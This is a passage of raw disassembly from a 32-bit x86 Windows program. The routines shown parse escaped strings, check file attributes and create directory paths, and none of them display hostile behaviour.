  403632:	66 8b 14 42          	mov    (%edx,%eax,2),%dx
  403636:	8b 1e                	mov    (%esi),%ebx
  403638:	66 89 14 19          	mov    %dx,(%ecx,%ebx,1)
  40363c:	40                   	inc    %eax
  40363d:	41                   	inc    %ecx
  40363e:	41                   	inc    %ecx
  40363f:	3b c7                	cmp    %edi,%eax
  403641:	7c ea                	jl     0x40362d
  403643:	5b                   	pop    %ebx
  403644:	01 7e 04             	add    %edi,0x4(%esi)
  403647:	8b 46 04             	mov    0x4(%esi),%eax
  40364a:	5f                   	pop    %edi
  40364b:	5e                   	pop    %esi
  40364c:	5d                   	pop    %ebp
  40364d:	c2 08 00             	ret    $0x8
  403650:	ff 74 24 04          	push   0x4(%esp)
  403654:	e8 90 fc ff ff       	call   0x4032e9
  403659:	85 c0                	test   %eax,%eax
  40365b:	59                   	pop    %ecx
  40365c:	75 1c                	jne    0x40367a
  40365e:	ff 15 98 a1 41 00    	call   *0x41a198
  403664:	83 f8 05             	cmp    $0x5,%eax
  403667:	75 0d                	jne    0x403676
  403669:	f6 05 d0 e9 41 00 08 	testb  $0x8,0x41e9d0
  403670:	74 04                	je     0x403676
  403672:	33 c0                	xor    %eax,%eax
  403674:	40                   	inc    %eax
  403675:	c3                   	ret
  403676:	83 c8 ff             	or     $0xffffffff,%eax
  403679:	c3                   	ret
  40367a:	33 c0                	xor    %eax,%eax
  40367c:	c3                   	ret
  40367d:	55                   	push   %ebp
  40367e:	8b ec                	mov    %esp,%ebp
  403680:	81 ec 50 02 00 00    	sub    $0x250,%esp
  403686:	56                   	push   %esi
  403687:	8b 75 08             	mov    0x8(%ebp),%esi
  40368a:	56                   	push   %esi
  40368b:	ff 15 a4 a1 41 00    	call   *0x41a1a4
  403691:	83 f8 ff             	cmp    $0xffffffff,%eax
  403694:	75 04                	jne    0x40369a
  403696:	33 c0                	xor    %eax,%eax
  403698:	eb 59                	jmp    0x4036f3
  40369a:	a8 10                	test   $0x10,%al
  40369c:	74 0d                	je     0x4036ab
  40369e:	6a 10                	push   $0x10
  4036a0:	ff 15 84 a1 41 00    	call   *0x41a184
  4036a6:	83 c8 ff             	or     $0xffffffff,%eax
  4036a9:	eb 48                	jmp    0x4036f3
  4036ab:	a1 cc e9 41 00       	mov    0x41e9cc,%eax
  4036b0:	85 c0                	test   %eax,%eax
  4036b2:	75 09                	jne    0x4036bd
  4036b4:	56                   	push   %esi
  4036b5:	e8 96 ff ff ff       	call   0x403650
  4036ba:	59                   	pop    %ecx
  4036bb:	eb 36                	jmp    0x4036f3
  4036bd:	83 f8 02             	cmp    $0x2,%eax
  4036c0:	75 2e                	jne    0x4036f0
  4036c2:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
  4036c8:	50                   	push   %eax
  4036c9:	56                   	push   %esi
  4036ca:	ff 15 00 a1 41 00    	call   *0x41a100
  4036d0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036d3:	74 df                	je     0x4036b4
  4036d5:	50                   	push   %eax
  4036d6:	ff 15 0c a1 41 00    	call   *0x41a10c
  4036dc:	ff 75 0c             	push   0xc(%ebp)
  4036df:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4036e5:	50                   	push   %eax
  4036e6:	ff 15 f8 a0 41 00    	call   *0x41a0f8
  4036ec:	85 c0                	test   %eax,%eax
  4036ee:	7c c4                	jl     0x4036b4
  4036f0:	33 c0                	xor    %eax,%eax
  4036f2:	40                   	inc    %eax
  4036f3:	5e                   	pop    %esi
  4036f4:	c9                   	leave
  4036f5:	c3                   	ret
  4036f6:	55                   	push   %ebp
  4036f7:	8b ec                	mov    %esp,%ebp
  4036f9:	83 ec 5c             	sub    $0x5c,%esp
  4036fc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403700:	53                   	push   %ebx
  403701:	56                   	push   %esi
  403702:	57                   	push   %edi
  403703:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403706:	e8 0e f4 ff ff       	call   0x402b19
  40370b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40370e:	e9 85 02 00 00       	jmp    0x403998
  403713:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  403716:	e8 d0 dd ff ff       	call   0x4014eb
  40371b:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40371e:	e8 c8 dd ff ff       	call   0x4014eb
  403723:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403726:	8b 07                	mov    (%edi),%eax
  403728:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40372b:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  40372e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403731:	e8 e3 f3 ff ff       	call   0x402b19
  403736:	8a 0e                	mov    (%esi),%cl
  403738:	33 db                	xor    %ebx,%ebx
  40373a:	eb 14                	jmp    0x403750
  40373c:	80 f9 3d             	cmp    $0x3d,%cl
  40373f:	74 1d                	je     0x40375e
  403741:	ff 75 f4             	push   -0xc(%ebp)
  403744:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403747:	e8 d5 f4 ff ff       	call   0x402c21
  40374c:	43                   	inc    %ebx
  40374d:	8a 0c 1e             	mov    (%esi,%ebx,1),%cl
  403750:	8a c1                	mov    %cl,%al
  403752:	88 4d f4             	mov    %cl,-0xc(%ebp)
  403755:	e8 57 e7 ff ff       	call   0x401eb1
  40375a:	84 c0                	test   %al,%al
  40375c:	74 de                	je     0x40373c
  40375e:	68 e9 fd 00 00       	push   $0xfde9
  403763:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403766:	50                   	push   %eax
  403767:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40376a:	50                   	push   %eax
  40376b:	e8 5e f6 ff ff       	call   0x402dce
  403770:	83 c4 0c             	add    $0xc,%esp
  403773:	50                   	push   %eax
  403774:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  403777:	e8 c0 dc ff ff       	call   0x40143c
  40377c:	ff 75 c8             	push   -0x38(%ebp)
  40377f:	e8 e6 5a 01 00       	call   0x41926a
  403784:	ff 75 d4             	push   -0x2c(%ebp)
  403787:	e8 de 5a 01 00       	call   0x41926a
  40378c:	85 db                	test   %ebx,%ebx
  40378e:	59                   	pop    %ecx
  40378f:	59                   	pop    %ecx
  403790:	0f 84 20 02 00 00    	je     0x4039b6
  403796:	01 5d fc             	add    %ebx,-0x4(%ebp)
  403799:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40379c:	8b d7                	mov    %edi,%edx
  40379e:	e8 20 f1 ff ff       	call   0x4028c3
  4037a3:	84 c0                	test   %al,%al
  4037a5:	0f 84 13 02 00 00    	je     0x4039be
  4037ab:	8b 07                	mov    (%edi),%eax
  4037ad:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4037b0:	80 3c 01 3d          	cmpb   $0x3d,(%ecx,%eax,1)
  4037b4:	0f 85 04 02 00 00    	jne    0x4039be
  4037ba:	ff 45 fc             	incl   -0x4(%ebp)
  4037bd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4037c0:	e8 fe f0 ff ff       	call   0x4028c3
  4037c5:	84 c0                	test   %al,%al
  4037c7:	0f 84 f1 01 00 00    	je     0x4039be
  4037cd:	8b 07                	mov    (%edi),%eax
  4037cf:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4037d2:	8a 04 06             	mov    (%esi,%eax,1),%al
  4037d5:	3c 22                	cmp    $0x22,%al
  4037d7:	74 1e                	je     0x4037f7
  4037d9:	3c 2d                	cmp    $0x2d,%al
  4037db:	0f 85 dd 01 00 00    	jne    0x4039be
  4037e1:	ff 75 a4             	push   -0x5c(%ebp)
  4037e4:	ff 75 0c             	push   0xc(%ebp)
  4037e7:	e8 6c f1 ff ff       	call   0x402958
  4037ec:	59                   	pop    %ecx
  4037ed:	46                   	inc    %esi
  4037ee:	59                   	pop    %ecx
  4037ef:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4037f2:	e9 99 01 00 00       	jmp    0x403990
  4037f7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4037fa:	8b 1d 30 a2 41 00    	mov    0x41a230,%ebx
  403800:	46                   	inc    %esi
  403801:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  403805:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403808:	c6 00 00             	movb   $0x0,(%eax)
  40380b:	eb 7c                	jmp    0x403889
  40380d:	3b 77 04             	cmp    0x4(%edi),%esi
  403810:	0f 8d a8 01 00 00    	jge    0x4039be
  403816:	8b 07                	mov    (%edi),%eax
  403818:	8a 0c 30             	mov    (%eax,%esi,1),%cl
  40381b:	46                   	inc    %esi
  40381c:	80 f9 22             	cmp    $0x22,%cl
  40381f:	88 4d ec             	mov    %cl,-0x14(%ebp)
  403822:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403825:	0f 84 ad 00 00 00    	je     0x4038d8
  40382b:	80 f9 5c             	cmp    $0x5c,%cl
  40382e:	75 39                	jne    0x403869
  403830:	8a 04 30             	mov    (%eax,%esi,1),%al
  403833:	46                   	inc    %esi
  403834:	3c 22                	cmp    $0x22,%al
  403836:	88 45 f0             	mov    %al,-0x10(%ebp)
  403839:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40383c:	74 27                	je     0x403865
  40383e:	3a c1                	cmp    %cl,%al
  403840:	74 1f                	je     0x403861
  403842:	3c 6e                	cmp    $0x6e,%al
  403844:	74 17                	je     0x40385d
  403846:	3c 74                	cmp    $0x74,%al
  403848:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40384b:	74 0c                	je     0x403859
  40384d:	6a 5c                	push   $0x5c
  40384f:	e8 cd f3 ff ff       	call   0x402c21
  403854:	ff 75 f0             	push   -0x10(%ebp)
  403857:	eb 13                	jmp    0x40386c
  403859:	6a 09                	push   $0x9
  40385b:	eb 12                	jmp    0x40386f
  40385d:	6a 0a                	push   $0xa
  40385f:	eb 0b                	jmp    0x40386c
  403861:	6a 5c                	push   $0x5c
  403863:	eb 07                	jmp    0x40386c
  403865:	6a 22                	push   $0x22
  403867:	eb 03                	jmp    0x40386c
  403869:	ff 75 ec             	push   -0x14(%ebp)
  40386c:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40386f:	e8 ad f3 ff ff       	call   0x402c21
  403874:	8b 07                	mov    (%edi),%eax
  403876:	6a 05                	push   $0x5
  403878:	03 c6                	add    %esi,%eax
  40387a:	68 e4 a6 41 00       	push   $0x41a6e4
  40387f:	50                   	push   %eax
  403880:	ff d3                	call   *%ebx
  403882:	83 c4 0c             	add    $0xc,%esp
  403885:	85 c0                	test   %eax,%eax
  403887:	75 84                	jne    0x40380d
  403889:	8b 07                	mov    (%edi),%eax
  40388b:	6a 05                	push   $0x5
  40388d:	03 c6                	add    %esi,%eax
  40388f:	68 e4 a6 41 00       	push   $0x41a6e4
  403894:	50                   	push   %eax
  403895:	ff d3                	call   *%ebx
  403897:	83 c4 0c             	add    $0xc,%esp
  40389a:	85 c0                	test   %eax,%eax
  40389c:	75 d6                	jne    0x403874
  40389e:	eb 23                	jmp    0x4038c3
  4038a0:	80 f9 22             	cmp    $0x22,%cl
  4038a3:	74 27                	je     0x4038cc
  4038a5:	80 f9 5c             	cmp    $0x5c,%cl
  4038a8:	75 08                	jne    0x4038b2
  4038aa:	80 7c 30 01 22       	cmpb   $0x22,0x1(%eax,%esi,1)
  4038af:	75 01                	jne    0x4038b2
  4038b1:	46                   	inc    %esi
  4038b2:	0f b6 04 30          	movzbl (%eax,%esi,1),%eax
  4038b6:	46                   	inc    %esi
  4038b7:	50                   	push   %eax
  4038b8:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4038bb:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4038be:	e8 5e f3 ff ff       	call   0x402c21
  4038c3:	8b 07                	mov    (%edi),%eax
  4038c5:	8a 0c 30             	mov    (%eax,%esi,1),%cl
  4038c8:	84 c9                	test   %cl,%cl
  4038ca:	75 d4                	jne    0x4038a0
  4038cc:	8b 07                	mov    (%edi),%eax
  4038ce:	80 3c 06 00          	cmpb   $0x0,(%esi,%eax,1)
  4038d2:	74 04                	je     0x4038d8
  4038d4:	46                   	inc    %esi
  4038d5:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4038d8:	68 e9 fd 00 00       	push   $0xfde9
  4038dd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4038e0:	50                   	push   %eax
  4038e1:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4038e4:	50                   	push   %eax
  4038e5:	e8 e4 f4 ff ff       	call   0x402dce
  4038ea:	83 c4 0c             	add    $0xc,%esp
  4038ed:	50                   	push   %eax
  4038ee:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4038f1:	e8 46 db ff ff       	call   0x40143c
  4038f6:	ff 75 bc             	push   -0x44(%ebp)
  4038f9:	e8 6c 59 01 00       	call   0x41926a
  4038fe:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403901:	50                   	push   %eax
  403902:	e8 c5 f7 ff ff       	call   0x4030cc
  403907:	59                   	pop    %ecx
  403908:	59                   	pop    %ecx
  403909:	68 c4 a6 41 00       	push   $0x41a6c4
  40390e:	ff 75 a4             	push   -0x5c(%ebp)
  403911:	ff 15 24 a1 41 00    	call   *0x41a124
  403917:	85 c0                	test   %eax,%eax
  403919:	75 14                	jne    0x40392f
  40391b:	6a 3d                	push   $0x3d
  40391d:	ff 75 b0             	push   -0x50(%ebp)
  403920:	e8 6e ed 00 00       	call   0x412693
  403925:	85 c0                	test   %eax,%eax
  403927:	59                   	pop    %ecx
  403928:	59                   	pop    %ecx
  403929:	0f 8e 8f 00 00 00    	jle    0x4039be
  40392f:	33 db                	xor    %ebx,%ebx
  403931:	39 1d 88 e0 41 00    	cmp    %ebx,0x41e088
  403937:	be 88 e0 41 00       	mov    $0x41e088,%esi
  40393c:	74 26                	je     0x403964
  40393e:	ff 36                	push   (%esi)
  403940:	ff 15 f4 a0 41 00    	call   *0x41a0f4
  403946:	50                   	push   %eax
  403947:	ff 36                	push   (%esi)
  403949:	ff 75 a4             	push   -0x5c(%ebp)
  40394c:	ff 15 34 a2 41 00    	call   *0x41a234
  403952:	83 c4 0c             	add    $0xc,%esp
  403955:	85 c0                	test   %eax,%eax
  403957:	74 07                	je     0x403960
  403959:	83 c6 04             	add    $0x4,%esi
  40395c:	39 1e                	cmp    %ebx,(%esi)
  40395e:	75 de                	jne    0x40393e
  403960:	39 1e                	cmp    %ebx,(%esi)
  403962:	75 20                	jne    0x403984
  403964:	53                   	push   %ebx
  403965:	ff 75 a4             	push   -0x5c(%ebp)
  403968:	ff 75 0c             	push   0xc(%ebp)
  40396b:	e8 a0 ef ff ff       	call   0x402910
  403970:	83 c4 0c             	add    $0xc,%esp
  403973:	3b c3                	cmp    %ebx,%eax
  403975:	74 0d                	je     0x403984
  403977:	ff 75 b0             	push   -0x50(%ebp)
  40397a:	8d 48 0c             	lea    0xc(%eax),%ecx
  40397d:	e8 81 da ff ff       	call   0x401403
  403982:	eb 0c                	jmp    0x403990
  403984:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403987:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40398a:	50                   	push   %eax
  40398b:	e8 3f fc ff ff       	call   0x4035cf
  403990:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  403993:	e8 f8 ef ff ff       	call   0x402990
  403998:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40399b:	8b d7                	mov    %edi,%edx
  40399d:	e8 21 ef ff ff       	call   0x4028c3
  4039a2:	84 c0                	test   %al,%al
  4039a4:	0f 85 69 fd ff ff    	jne    0x403713
  4039aa:	ff 75 e0             	push   -0x20(%ebp)
  4039ad:	e8 b8 58 01 00       	call   0x41926a
  4039b2:	b0 01                	mov    $0x1,%al
  4039b4:	eb 2b                	jmp    0x4039e1
  4039b6:	ff 75 10             	push   0x10(%ebp)
  4039b9:	ff 75 fc             	push   -0x4(%ebp)
  4039bc:	eb 06                	jmp    0x4039c4
  4039be:	ff 75 10             	push   0x10(%ebp)
  4039c1:	ff 75 f8             	push   -0x8(%ebp)
  4039c4:	57                   	push   %edi
  4039c5:	e8 5c f6 ff ff       	call   0x403026
  4039ca:	83 c4 0c             	add    $0xc,%esp
  4039cd:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4039d0:	8a d8                	mov    %al,%bl
  4039d2:	e8 b9 ef ff ff       	call   0x402990
  4039d7:	ff 75 e0             	push   -0x20(%ebp)
  4039da:	e8 8b 58 01 00       	call   0x41926a
  4039df:	8a c3                	mov    %bl,%al
  4039e1:	59                   	pop    %ecx
  4039e2:	5f                   	pop    %edi
  4039e3:	5e                   	pop    %esi
  4039e4:	5b                   	pop    %ebx
  4039e5:	c9                   	leave
  4039e6:	c3                   	ret
  4039e7:	55                   	push   %ebp
  4039e8:	8b ec                	mov    %esp,%ebp
  4039ea:	83 ec 18             	sub    $0x18,%esp
  4039ed:	53                   	push   %ebx
  4039ee:	56                   	push   %esi
  4039ef:	57                   	push   %edi
  4039f0:	8b 7d 08             	mov    0x8(%ebp),%edi
  4039f3:	57                   	push   %edi
  4039f4:	ff 15 f4 a0 41 00    	call   *0x41a0f4
  4039fa:	57                   	push   %edi
  4039fb:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4039fe:	8b d8                	mov    %eax,%ebx
  403a00:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a03:	e8 5f f0 ff ff       	call   0x402a67
  403a08:	33 f6                	xor    %esi,%esi
  403a0a:	39 75 f0             	cmp    %esi,-0x10(%ebp)
  403a0d:	7f 09                	jg     0x403a18
  403a0f:	56                   	push   %esi
  403a10:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403a13:	e8 9f d7 ff ff       	call   0x4011b7
  403a18:	0f b7 44 5f fe       	movzwl -0x2(%edi,%ebx,2),%eax
  403a1d:	66 3d 5c 00          	cmp    $0x5c,%ax
  403a21:	8b 7d e8             	mov    -0x18(%ebp),%edi
  403a24:	74 06                	je     0x403a2c
  403a26:	66 3d 2f 00          	cmp    $0x2f,%ax
  403a2a:	75 09                	jne    0x403a35
  403a2c:	66 89 74 5f fe       	mov    %si,-0x2(%edi,%ebx,2)
  403a31:	4b                   	dec    %ebx
  403a32:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403a35:	8b f3                	mov    %ebx,%esi
  403a37:	eb 22                	jmp    0x403a5b
  403a39:	0f b7 04 77          	movzwl (%edi,%esi,2),%eax
  403a3d:	66 3d 2f 00          	cmp    $0x2f,%ax
  403a41:	74 0b                	je     0x403a4e
  403a43:	66 3d 5c 00          	cmp    $0x5c,%ax
  403a47:	74 05                	je     0x403a4e
  403a49:	4e                   	dec    %esi
  403a4a:	85 f6                	test   %esi,%esi
  403a4c:	7f eb                	jg     0x403a39
  403a4e:	85 f6                	test   %esi,%esi
  403a50:	0f 84 b4 00 00 00    	je     0x403b0a
  403a56:	66 83 24 77 00       	andw   $0x0,(%edi,%esi,2)
  403a5b:	57                   	push   %edi
  403a5c:	e8 0a e4 ff ff       	call   0x401e6b
  403a61:	85 c0                	test   %eax,%eax
  403a63:	59                   	pop    %ecx
  403a64:	74 e4                	je     0x403a4a
  403a66:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403a69:	50                   	push   %eax
  403a6a:	ff 15 f0 a0 41 00    	call   *0x41a0f0
  403a70:	57                   	push   %edi
  403a71:	ff 15 a4 a1 41 00    	call   *0x41a1a4
  403a77:	a8 10                	test   $0x10,%al
  403a79:	75 17                	jne    0x403a92
  403a7b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403a7e:	50                   	push   %eax
  403a7f:	57                   	push   %edi
  403a80:	e8 f8 fb ff ff       	call   0x40367d
  403a85:	85 c0                	test   %eax,%eax
  403a87:	59                   	pop    %ecx
  403a88:	59                   	pop    %ecx
  403a89:	74 07                	je     0x403a92
  403a8b:	33 f6                	xor    %esi,%esi
  403a8d:	e9 9d 00 00 00       	jmp    0x403b2f
  403a92:	57                   	push   %edi
  403a93:	e8 d3 e3 ff ff       	call   0x401e6b
  403a98:	85 c0                	test   %eax,%eax
  403a9a:	59                   	pop    %ecx
  403a9b:	75 0f                	jne    0x403aac
  403a9d:	57                   	push   %edi
  403a9e:	6a 0c                	push   $0xc
  403aa0:	6a 01                	push   $0x1
  403aa2:	e8 5f 5b 00 00       	call   0x409606
  403aa7:	83 c4 0c             	add    $0xc,%esp
  403aaa:	eb df                	jmp    0x403a8b
  403aac:	3b f3                	cmp    %ebx,%esi
  403aae:	7d 4e                	jge    0x403afe
  403ab0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403ab3:	2b c6                	sub    %esi,%eax
  403ab5:	40                   	inc    %eax
  403ab6:	50                   	push   %eax
  403ab7:	8b 45 08             	mov    0x8(%ebp),%eax
  403aba:	8d 04 70             	lea    (%eax,%esi,2),%eax
  403abd:	50                   	push   %eax
  403abe:	8d 1c 77             	lea    (%edi,%esi,2),%ebx
  403ac1:	53                   	push   %ebx
  403ac2:	e8 f3 57 01 00       	call   0x4192ba
  403ac7:	33 c9                	xor    %ecx,%ecx
  403ac9:	83 c4 0c             	add    $0xc,%esp
  403acc:	66 39 0b             	cmp    %cx,(%ebx)
  403acf:	74 13                	je     0x403ae4
  403ad1:	eb 10                	jmp    0x403ae3
  403ad3:	0f b7 04 77          	movzwl (%edi,%esi,2),%eax
  403ad7:	66 3d 5c 00          	cmp    $0x5c,%ax
  403adb:	74 0d                	je     0x403aea
  403add:	66 3d 2f 00          	cmp    $0x2f,%ax
  403ae1:	74 07                	je     0x403aea
  403ae3:	46                   	inc    %esi
  403ae4:	66 39 0c 77          	cmp    %cx,(%edi,%esi,2)
  403ae8:	75 e9                	jne    0x403ad3
  403aea:	57                   	push   %edi
  403aeb:	66 89 0c 77          	mov    %cx,(%edi,%esi,2)
  403aef:	e8 77 e3 ff ff       	call   0x401e6b
  403af4:	85 c0                	test   %eax,%eax
  403af6:	59                   	pop    %ecx
  403af7:	74 a4                	je     0x403a9d
  403af9:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  403afc:	7c b2                	jl     0x403ab0
  403afe:	57                   	push   %edi
  403aff:	e8 66 57 01 00       	call   0x41926a
  403b04:	33 c0                	xor    %eax,%eax
  403b06:	59                   	pop    %ecx
  403b07:	40                   	inc    %eax
  403b08:	eb 45                	jmp    0x403b4f
  403b0a:	83 fb 02             	cmp    $0x2,%ebx
  403b0d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403b10:	75 28                	jne    0x403b3a
  403b12:	66 8b 01             	mov    (%ecx),%ax
  403b15:	66 0d 20 00          	or     $0x20,%ax
  403b19:	66 3d 61 00          	cmp    $0x61,%ax
  403b1d:	72 1b                	jb     0x403b3a
  403b1f:	66 3d 7a 00          	cmp    $0x7a,%ax
  403b23:	77 15                	ja     0x403b3a
  403b25:	66 83 79 02 3a       	cmpw   $0x3a,0x2(%ecx)
  403b2a:	75 0e                	jne    0x403b3a
  403b2c:	33 f6                	xor    %esi,%esi
  403b2e:	46                   	inc    %esi
  403b2f:	57                   	push   %edi
  403b30:	e8 35 57 01 00       	call   0x41926a
  403b35:	59                   	pop    %ecx
  403b36:	8b c6                	mov    %esi,%eax
  403b38:	eb 15                	jmp    0x403b4f
  403b3a:	51                   	push   %ecx
  403b3b:	6a 0c                	push   $0xc
  403b3d:	6a 01                	push   $0x1
  403b3f:	e8 c2 5a 00 00       	call   0x409606
  403b44:	57                   	push   %edi
  403b45:	e8 20 57 01 00       	call   0x41926a
  403b4a:	83 c4 10             	add    $0x10,%esp
  403b4d:	33 c0                	xor    %eax,%eax
  403b4f:	5f                   	pop    %edi
  403b50:	5e                   	pop    %esi
  403b51:	5b                   	pop    %ebx
  403b52:	c9                   	leave
  403b53:	c3                   	ret
  403b54:	55                   	push   %ebp
  403b55:	8b ec                	mov    %esp,%ebp
  403b57:	81 ec 7c 02 00 00    	sub    $0x27c,%esp
  403b5d:	53                   	push   %ebx
  403b5e:	8b 1d d4 a1 41 00    	mov    0x41a1d4,%ebx
  403b64:	56                   	push   %esi
  403b65:	8b 75 08             	mov    0x8(%ebp),%esi
  403b68:	0f b7 06             	movzwl (%esi),%eax
  403b6b:	66 3d 30 00          	cmp    $0x30,%ax
  403b6f:	72 0c                	jb     0x403b7d
  403b71:	66 3d 39 00          	cmp    $0x39,%ax
  403b75:	77 06                	ja     0x403b7d
  403b77:	56                   	push   %esi
  403b78:	ff d3                	call   *%ebx
  403b7a:	59                   	pop    %ecx
  403b7b:	eb 7b                	jmp    0x403bf8
  403b7d:	0f b7 c0             	movzwl %ax,%eax
  403b80:	6a 20                	push   $0x20
  403b82:	59                   	pop    %ecx
  403b83:	0b c1                	or     %ecx,%eax
  403b85:	83 e8 64             	sub    $0x64,%eax
  403b88:	74 58                	je     0x403be2
  403b8a:	83 e8 0c             	sub    $0xc,%eax
  403b8d:	74 3c                	je     0x403bcb
  403b8f:	83 e8 03             	sub    $0x3,%eax
  403b92:	74 1f                	je     0x403bb3
  403b94:	48                   	dec    %eax
  403b95:	0f 85 f7 02 00 00    	jne    0x403e92
  403b9b:	66 8b 46 02          	mov    0x2(%esi),%ax
  403b9f:	66 0b c1             	or     %cx,%ax
  403ba2:	66 2d 75 00          	sub    $0x75,%ax
  403ba6:	66 f7 d8             	neg    %ax
  403ba9:	1b c0                	sbb    %eax,%eax
  403bab:	83 e0 11             	and    $0x11,%eax
  403bae:	83 c0 07             	add    $0x7,%eax
  403bb1:	eb 45                	jmp    0x403bf8
  403bb3:	66 8b 46 02          	mov    0x2(%esi),%ax
  403bb7:	66 0b c1             	or     %cx,%ax
  403bba:	66 2d 75 00          	sub    $0x75,%ax
  403bbe:	66 f7 d8             	neg    %ax
  403bc1:	1b c0                	sbb    %eax,%eax
  403bc3:	83 e0 0b             	and    $0xb,%eax
  403bc6:	83 c0 0b             	add    $0xb,%eax
  403bc9:	eb 2d                	jmp    0x403bf8
  403bcb:	66 8b 46 02          	mov    0x2(%esi),%ax
  403bcf:	66 0b c1             	or     %cx,%ax
  403bd2:	66 2d 75 00          	sub    $0x75,%ax
  403bd6:	66 f7 d8             	neg    %ax
  403bd9:	1b c0                	sbb    %eax,%eax
  403bdb:	83 e0 15             	and    $0x15,%eax
  403bde:	40                   	inc    %eax
  403bdf:	40                   	inc    %eax
  403be0:	eb 16                	jmp    0x403bf8
  403be2:	66 8b 46 02          	mov    0x2(%esi),%ax
  403be6:	66 0b c1             	or     %cx,%ax
  403be9:	66 2d 75 00          	sub    $0x75,%ax
  403bed:	66 f7 d8             	neg    %ax
  403bf0:	1b c0                	sbb    %eax,%eax
  403bf2:	83 e0 09             	and    $0x9,%eax
  403bf5:	83 c0 10             	add    $0x10,%eax
  403bf8:	57                   	push   %edi
  403bf9:	33 ff                	xor    %edi,%edi
  403bfb:	eb 0b                	jmp    0x403c08
  403bfd:	66 3b cf             	cmp    %di,%cx
  403c00:	0f 84 8b 02 00 00    	je     0x403e91
  403c06:	46                   	inc    %esi
  403c07:	46                   	inc    %esi
  403c08:	0f b7 0e             	movzwl (%esi),%ecx
  403c0b:	66 83 f9 2c          	cmp    $0x2c,%cx
  403c0f:	75 ec                	jne    0x403bfd
  403c11:	57                   	push   %edi
  403c12:	50                   	push   %eax
  403c13:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  403c19:	50                   	push   %eax
  403c1a:	57                   	push   %edi
  403c1b:	ff 15 5c a2 41 00    	call   *0x41a25c
  403c21:	85 c0                	test   %eax,%eax
  403c23:	0f 84 68 02 00 00    	je     0x403e91
  403c29:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  403c2f:	50                   	push   %eax
  403c30:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403c33:	e8 2f ee ff ff       	call   0x402a67
  403c38:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  403c3b:	e8 ab d8 ff ff       	call   0x4014eb
  403c40:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403c43:	e8 a3 d8 ff ff       	call   0x4014eb
  403c48:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403c4b:	e8 9b d8 ff ff       	call   0x4014eb
  403c50:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403c53:	e8 93 d8 ff ff       	call   0x4014eb
  403c58:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403c5b:	e8 8b d8 ff ff       	call   0x4014eb
  403c60:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  403c63:	e8 83 d8 ff ff       	call   0x4014eb
  403c68:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  403c6b:	e8 7b d8 ff ff       	call   0x4014eb
  403c70:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  403c73:	e8 73 d8 ff ff       	call   0x4014eb
  403c78:	8d 45 9c             	lea    -0x64(%ebp),%eax
  403c7b:	50                   	push   %eax
  403c7c:	56                   	push   %esi
  403c7d:	e8 b1 f6 ff ff       	call   0x403333
  403c82:	39 7d a0             	cmp    %edi,-0x60(%ebp)
  403c85:	59                   	pop    %ecx
  403c86:	59                   	pop    %ecx
  403c87:	75 40                	jne    0x403cc9
  403c89:	ff 75 90             	push   -0x70(%ebp)
  403c8c:	e8 d9 55 01 00       	call   0x41926a
  403c91:	ff 75 a8             	push   -0x58(%ebp)
  403c94:	e8 d1 55 01 00       	call   0x41926a
  403c99:	ff 75 c0             	push   -0x40(%ebp)
  403c9c:	e8 c9 55 01 00       	call   0x41926a
  403ca1:	ff 75 f0             	push   -0x10(%ebp)
  403ca4:	e8 c1 55 01 00       	call   0x41926a
